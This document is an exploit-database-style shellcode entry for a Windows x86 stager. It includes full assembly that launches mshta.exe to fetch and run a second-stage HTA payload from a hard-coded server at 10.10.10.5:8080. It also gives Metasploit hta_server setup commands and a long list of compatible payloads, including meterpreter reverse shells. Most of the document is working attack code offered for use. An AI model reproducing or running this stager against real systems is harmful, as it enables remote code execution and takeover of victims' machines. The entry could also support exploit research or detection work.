# Exploit Title: Windows/x86 - Stager Generic MSHTA Shellcode (143 bytes)
# Exploit Author: Armando Huesca Prida
# Date: 11-01-2021
# Tested on:  Windows 7 Professional 6.1.7601 SP1 Build 7601 (x86)
# Windows Vista Ultimate 6.0.6002 SP2 Build 6002 (x86)
# Windows Server 2003 Enterprise Edition 5.2.3790 SP1 Build 3790 (x86)

## Description: Windows x86 Shellcode that uses mshta.exe binary to execute a second stage payload delivered through metasploit's hta_server exploit. This shellcode uses JMP/CALL/POP technic and static kernel32.dll functions addresses.

## Metasploit compatible payload list:

# generic/custom
# generic/debug_trap
# generic/shell_bind_tcp
# generic/shell_reverse_tcp
# generic/tight_loop
# windows/dllinject/bind_hidden_ipknock_tcp
# windows/dllinject/bind_hidden_tcp
# windows/dllinject/bind_ipv6_tcp
# windows/dllinject/bind_ipv6_tcp_uuid
# windows/dllinject/bind_named_pipe
# windows/dllinject/bind_nonx_tcp
# windows/dllinject/bind_tcp
# windows/dllinject/bind_tcp_rc4
# windows/dllinject/bind_tcp_uuid
# windows/dllinject/reverse_hop_http
# windows/dllinject/reverse_http
# windows/dllinject/reverse_http_proxy_pstore
# windows/dllinject/reverse_ipv6_tcp
# windows/dllinject/reverse_nonx_tcp
# windows/dllinject/reverse_ord_tcp
# windows/dllinject/reverse_tcp
# windows/dllinject/reverse_tcp_allports
# windows/dllinject/reverse_tcp_dns
# windows/dllinject/reverse_tcp_rc4
# windows/dllinject/reverse_tcp_rc4_dns
# windows/dllinject/reverse_tcp_uuid
# windows/dllinject/reverse_winhttp
# windows/dns_txt_query_exec
# windows/download_exec
# windows/exec
# windows/loadlibrary
# windows/messagebox
# windows/meterpreter/bind_hidden_ipknock_tcp
# windows/meterpreter/bind_hidden_tcp
# windows/meterpreter/bind_ipv6_tcp
# windows/meterpreter/bind_ipv6_tcp_uuid
# windows/meterpreter/bind_named_pipe
# windows/meterpreter/bind_nonx_tcp
# windows/meterpreter/bind_tcp
# windows/meterpreter/bind_tcp_rc4
# windows/meterpreter/bind_tcp_uuid
# windows/meterpreter/reverse_hop_http
# windows/meterpreter/reverse_http
# windows/meterpreter/reverse_http_proxy_pstore
# windows/meterpreter/reverse_https
# windows/meterpreter/reverse_https_proxy
# windows/meterpreter/reverse_ipv6_tcp
# windows/meterpreter/reverse_named_pipe
# windows/meterpreter/reverse_nonx_tcp
# windows/meterpreter/reverse_ord_tcp
# windows/meterpreter/reverse_tcp
# windows/meterpreter/reverse_tcp_allports
# windows/meterpreter/reverse_tcp_dns
# windows/meterpreter/reverse_tcp_rc4
# windows/meterpreter/reverse_tcp_rc4_dns
# windows/meterpreter/reverse_tcp_uuid
# windows/meterpreter/reverse_winhttp
# windows/meterpreter/reverse_winhttps
# windows/metsvc_bind_tcp
# windows/metsvc_reverse_tcp
# windows/patchupdllinject/bind_hidden_ipknock_tcp
# windows/patchupdllinject/bind_hidden_tcp
# windows/patchupdllinject/bind_ipv6_tcp
# windows/patchupdllinject/bind_ipv6_tcp_uuid
# windows/patchupdllinject/bind_named_pipe
# windows/patchupdllinject/bind_nonx_tcp
# windows/patchupdllinject/bind_tcp
# windows/patchupdllinject/bind_tcp_rc4
# windows/patchupdllinject/bind_tcp_uuid
# windows/patchupdllinject/reverse_ipv6_tcp
# windows/patchupdllinject/reverse_nonx_tcp
# windows/patchupdllinject/reverse_ord_tcp
# windows/patchupdllinject/reverse_tcp
# windows/patchupdllinject/reverse_tcp_allports
# windows/patchupdllinject/reverse_tcp_dns
# windows/patchupdllinject/reverse_tcp_rc4
# windows/patchupdllinject/reverse_tcp_rc4_dns
# windows/patchupdllinject/reverse_tcp_uuid
# windows/patchupmeterpreter/bind_hidden_ipknock_tcp
# windows/patchupmeterpreter/bind_hidden_tcp
# windows/patchupmeterpreter/bind_ipv6_tcp
# windows/patchupmeterpreter/bind_ipv6_tcp_uuid
# windows/patchupmeterpreter/bind_named_pipe
# windows/patchupmeterpreter/bind_nonx_tcp
# windows/patchupmeterpreter/bind_tcp
# windows/patchupmeterpreter/bind_tcp_rc4
# windows/patchupmeterpreter/bind_tcp_uuid
# windows/patchupmeterpreter/reverse_ipv6_tcp
# windows/patchupmeterpreter/reverse_nonx_tcp
# windows/patchupmeterpreter/reverse_ord_tcp
# windows/patchupmeterpreter/reverse_tcp
# windows/patchupmeterpreter/reverse_tcp_allports


# "hta_server" exploit payloads setting example:

# msf6 > use exploit/windows/misc/hta_server (exploit for second stage payload delivery)
# msf6 exploit(windows/misc/hta_server) > set payload windows/exec (a payload from the previously specified list)
# msf6 exploit(windows/misc/hta_server) > set uripath 2NWyfQ9T.hta (a static value for URIPATH)
# msf6 exploit(windows/misc/hta_server) > set CMD calc.exe (command to be executed ex: calc.exe binary)
# msf6 exploit(windows/misc/hta_server) > run	(second stage delivery server execution)


# Shellcode considerations:

# Function address of CreateProcessA in kernel32.dll: 0x75732082
# Function address of ExitProcess in kernel32.dll: 0x7578214f
# Size in bytes of message db parameter, 65 bytes -> 0x41 hex
# Message db contains a strings with the static path windows location of mshta.exe binary and the url obtained from hta_server exploit


# Assembly Shellcode:



global _start

section .text

_start:
	jmp application

firststep:
	pop edi
	xor eax, eax
	mov [edi+65], al		; size in bytes of message db parameter

StartUpInfoANDProcessInformation:

	push eax			; hStderror null in this case
	push eax			; hStdOutput, null
	push eax			; hStdInput, null
	xor ebx, ebx
	xor ecx, ecx
	add cl, 0x12			; 18 times loop to fill both structures.

looper:
	push ebx
	loop looper

	;mov word [esp+0x3c], 0x0101	; dwflag arg in startupinfo
	mov bx, 0x1111
	sub bx, 0x1010
	mov word [esp+0x3c], bx
	mov byte [esp+0x10], 0x44	; cb=0x44
	lea eax, [esp+0x10]		; eax points to StartUpInfo

					; eax has a pointer to StartUPinfo
					; esp has a pointer to Process_Info containing null values
createprocessA:
	push esp			; pointer to Process-Info
	push eax			; pointer to StartUpInfo
	xor ebx, ebx
	push ebx			; null
	push ebx			; null
	push ebx			; null
	inc ebx
	push ebx			; bInheritHandles=true
	dec ebx
	push ebx			; null
	push ebx			; null
	push edi			; pointer to message db string
	push ebx			; null
	mov edx, 0x75732082		; CreateProcessA addr in kernel32.dll
	call edx

ExitProcess:
	push eax			; createprocessA return in eax
	mov edx, 0x7578214f		; ExitProcess addr in kernel32.dll
	call edx

application:
	call firststep
	message db "c:\windows\system32\mshta.exe http://10.10.10.5:8080/2NWyfQ9T.hta"